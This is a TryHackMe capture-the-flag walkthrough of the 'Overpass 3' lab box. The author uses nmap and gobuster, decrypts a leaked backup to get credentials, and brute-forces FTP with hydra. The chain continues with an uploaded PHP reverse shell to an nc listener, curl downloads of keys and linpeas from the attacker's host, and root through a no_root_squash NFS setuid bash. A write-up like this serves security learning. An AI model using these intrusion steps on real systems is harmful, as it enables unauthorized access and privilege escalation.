# TryHackMe - Overpass 3 - Linux

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T4 -sC -sV -O -Pn -p- 10.10.4.129
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-30 17:50 EDT
Stats: 0:04:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 93.32% done; ETC: 17:55 (0:00:20 remaining)
Nmap scan report for 10.10.4.129
Host is up (0.21s latency).
Not shown: 65235 filtered tcp ports (no-response), 297 filtered tcp ports (admin-prohibited)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-title: Overpass Hosting
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 5.4 (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 317.52 seconds
```

## Gobuster

If we go to the website there is nothing specific that is visible so we can run a gobuster to check for hidden directories

```
┌──(root💀kali)-[~]
└─# gobuster dir -u http://10.10.4.129/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.4.129/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/30 17:54:11 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 218]
/.htaccess            (Status: 403) [Size: 218]
/backups              (Status: 301) [Size: 235] [--> http://10.10.4.129/backups/]
/cgi-bin/             (Status: 403) [Size: 217]
```

There is a backups page, in there we can find a backup.zip file.
The zip is easily extracted (not password protected). In it we find:
- A PGP private key
- An excel file CUstomerDetails.xlsx.gpg

## Decrypt the xlsx

- According to [this doc](https://www.gnupg.org/gph/en/manual/x110.html) it can be decrypted in one command but first we need to import the private key with `pgp --import priv.key`
- And then we can decrypt the file:
```
┌──(root💀kali)-[~/Documents/tryhackme/overpass3/backup]
└─# gpg --output CustomerDetails.xlsx --decrypt CustomerDetails.xlsx.gpg
```
- Once decrypted the file can be opened with libre office (if you do not have Microsoft Excel like me ;) )
- And we get this
```
Customer Name	Username	Password	Credit card number	CVC
Par. A. Doxx	paradox	ShibesAreGreat123	4111 1111 4555 1142	432
0day Montgomery	0day	OllieIsTheBestDog	5555 3412 4444 1115	642
Muir Land	muirlandoracle	A11D0gsAreAw3s0me	5103 2219 1119 9245	737
```

So we have usernames and passwords:
- paradox	ShibesAreGreat123
- 0day	OllieIsTheBestDog
- muirlandoracle	A11D0gsAreAw3s0me

We can put them both in separate files for later use

## FTP

- Let's see if we can use those to connect through ftp. (note: I tried with ssh but password authentication is not supported)
- Using hydra we have a hit!
```
┌──(root💀kali)-[~/Documents/tryhackme/overpass3]
└─# hydra -L users -P pass 10.10.4.129 -t 4 ftp                                                                                                                                                          255 ⨯
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-30 18:17:40
[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:3/p:3), ~3 tries per task
[DATA] attacking ftp://10.10.4.129:21/
[21][ftp] host: 10.10.4.129   login: paradox   password: ShibesAreGreat123
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-30 18:17:48
```
- So we can connext to the ftp using the creds paradox:ShibesAreGreat123
- It seems like this the ftp used to serve the website. We have write permission so we can try to get rce this way.
- As it is apache we can try to use a php reverse shell. Lets take the one from [pentestmonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
- We modify the IP address and port as we wish
- we set up our listener `rlwrap nc -lvp 1234` (rlwrap will allow us to have a more interactive shell which is pretty convenient)
- We put ou reverse shell on the ftp 
```
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
200 EPRT command successful. Consider using EPSV.
150 Ok to send data.
100% |******************************************************************************************************************************************************************|  5493       11.19 MiB/s    00:00 ETA
226 Transfer complete.
5493 bytes sent in 00:00 (8.73 KiB/s)
```
- And now we can navigate to our shell using our browser `http://10.10.4.129/php-reverse-shell.php`
- We get a shell!!
```
whoami
apache
sh-4.4$ 
```
- Let's use the command find to find a flag `find / -name *flag* 2>/dev/null`
There is one here: `/usr/share/httpd/web.flag`
- We have the web flag
- We could try the passwords we got previously with the su command
- Let's try with james we get failure with all three pass. Lets try with paradox, it works with the password ShibesAreGreat123
- If we ls -al the home directory we have an authorized key for paradox so we could replace it with our public key to have a more stable shell. Lets generate an rsa_key
```
┌──(root💀kali)-[~/Documents/tryhackme/overpass3]
└─# ssh-keygen                                                                                                                                                                                             1 ⨯
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/Documents/tryhackme/overpass3/private
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/Documents/tryhackme/overpass3/private
Your public key has been saved in /root/Documents/tryhackme/overpass3/private.pub
The key fingerprint is:
SHA256:dpZvvEmhvr7eAEjEaGtCxsvxUKzvQ0waY0fTMmAZTLE root@kali
The key's randomart image is:
+---[RSA 3072]----+
| +*B.+.          |
| .O.O.o          |
| +EO =.          |
|  O *. .   .     |
| . @  . S + .    |
|  . +  . + + .   |
|   o      o =    |
|    o    . = o   |
|     .   o*o+    |
+----[SHA256]-----+
```
- Now we just need to replace the authorized_keys fil with our public key. First we copy our private key in an authorized_keys file `cp private.pub authorized_keys`
- Then we laucn an http server `python3 -m http.server 80`
- wget does not work in our target so we can use curl instead `curl http://10.13.22.56/authorized_keys --output authorized_keys`
- And now the authorized keys is our public key
- Now we can just connect this way `ssh -i private paradox@10.10.4.129`
- Let's get [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) on the machine to enumerate our way to root.
- We get linpeas in our machine `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64`
- We launch python http server `python3 -m http.server 80`
- We get it in our target using curl `curl http://10.13.22.56/linpeas_linux_amd64 --output linpeas`
- We make it executable `chmod +x linpeas`
- we launch it `./linpeas`
- There is a recent CVE `cve-2021-4034`
- But there is also this that seems interesting as linpeas highlight as a 95% PE vector
```
╔══════════╣ Analyzing NFS Exports Files (limit 70)
-rw-r--r--. 1 root root 54 Nov 18  2020 /etc/exports                                                                                                                                                           
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```
- Let's have a look at [this documentation from hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)
- We are not able to mount the share so we need to check the how is nfs running:
```
[paradox@ip-10-10-4-129 ~]$ rpcinfo -p | grep nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
```
- we could try to port forward `ssh paradox@10.10.4.129 -i private -L 2049:localhost:2049` and then mount the share
```
┌──(root💀kali)-[~/Documents/tryhackme/overpass3]
└─# mkdir nfs                                                                                                                                                                                              1 ⨯
                                                                                                                                                                                                               
┌──(root💀kali)-[~/Documents/tryhackme/overpass3]
└─# mount -v -t nfs localhost:/ nfs
mount.nfs: timeout set for Wed Mar 30 19:29:51 2022
mount.nfs: trying text-based options 'vers=4.2,addr=::1,clientaddr=::1'
```
- We now have access to the user flag and we also have the .ssh folder of james so we can use it to login as james 
```
┌──(root💀kali)-[~/…/tryhackme/overpass3/nfs/.ssh]
└─# ssh -i id_rsa james@10.10.4.129 
```
- It works
- Let's try to go further with the nfs misconfiguration
- For our attacking machine we run
```
cp /bin/bash nfs
chmod +s bash
```
- From our shell as jams we can now run
```
./bash -p
/home/james/bash: /lib64/libtinfo.so.6: no version information available (required by /home/james/bash)
/home/james/bash: /lib64/libc.so.6: version `GLIBC_2.33' not found (required by /home/james/bash)
```
- So we get this error we probably need another bash binary let's try with the one from the target machine.
- We copy it using scp to our attacking machine `scp -i .ssh/id_rsa james@10.10.4.129:/bin/bash .`
- Let's redo our chomd +s `chmod +s bash`
- We just need to `./bash -p` and it works!
```
bash-4.4# whoami
root
```
(in fact I accidentally type ./bash at first but then retyping `./bash -p` did the trick.
- we can get the root flag `bash-4.4# cat /root/root.flag`
